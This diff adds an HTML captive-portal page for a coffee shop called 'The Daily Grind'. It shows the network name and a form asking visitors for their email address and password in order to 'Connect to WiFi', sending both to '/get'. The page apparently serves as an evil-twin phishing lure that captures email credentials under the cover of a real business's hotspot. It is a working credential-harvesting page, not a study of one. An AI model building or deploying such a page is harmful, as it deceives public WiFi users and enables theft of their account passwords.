@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>The Daily Grind — WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#1c1008;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:390px;background:#2a1a0a;border:1px solid #3d2510;border-radius:16px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,0.5)}
+.top{padding:30px 28px 24px;text-align:center;border-bottom:1px solid #3d2510}
+.cup{font-size:36px;margin-bottom:10px}
+.shop-name{font-size:22px;font-weight:800;color:#e8d5b0;letter-spacing:0.5px}
+.shop-type{font-size:10px;color:#7a5a3a;letter-spacing:2.5px;text-transform:uppercase;margin-top:5px}
+.ssid-pill{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,0.05);border:1px solid #3d2510;border-radius:20px;padding:5px 14px;margin-top:14px}
+.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
+.ssid-pill span{font-size:11px;color:#7a5a3a}
+.ssid-pill strong{color:#a07850;font-weight:500}
+.body{padding:26px 28px 22px}
+.body h2{font-size:17px;font-weight:700;color:#d0b888;margin-bottom:4px}
+.body .sub{font-size:12.5px;color:#7a5a3a;margin-bottom:20px}
+.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#6a4a2a;margin-bottom:7px;margin-top:18px}
+input{width:100%;padding:12px 14px;border:1px solid #3d2510;border-radius:8px;font-size:14.5px;background:#1c1008;color:#d0b888}
+input:focus{outline:none;border-color:#8B6030;box-shadow:0 0 0 3px rgba(139,96,48,0.15)}
+input::placeholder{color:#3d2510}
+.btn{width:100%;padding:13px;margin-top:22px;border:none;border-radius:8px;background:#8B6030;color:#fff;font-size:13px;font-weight:700;letter-spacing:0.3px;cursor:pointer}
+.btn:active{opacity:0.9}
+.terms{font-size:11px;color:#4a3020;text-align:center;margin-top:14px;line-height:1.6}
+.terms a{color:#8B6030}
+.foot{background:#1c1008;border-top:1px solid #3d2510;padding:12px 28px;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:10.5px;color:#4a3020;text-decoration:none}
+.foot a{color:#7a5a3a}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="top">
+    <div class="cup">☕</div>
+    <div class="shop-name">The Daily Grind</div>
+    <div class="shop-type">Artisan Coffee &bull; Free WiFi</div>
+    <div class="ssid-pill"><div class="dot"></div><span>Network: <strong>DailyGrind_WiFi</strong></span></div>
+  </div>
+  <div class="body">
+    <h2>Welcome In</h2>
+    <p class="sub">Stay connected while you enjoy your coffee.</p>
+    <form action="/get">
+      <label class="lbl">Email Address</label>
+      <input name="email" type="text" placeholder="you@example.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="Enter your password" required>
+      <button type="submit" class="btn">Connect to WiFi</button>
+      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
+    </form>
+  </div>
+  <div class="foot"><span>&copy; The Daily Grind</span><a href="#">Help</a></div>
+</div>
+</body>
+</html>
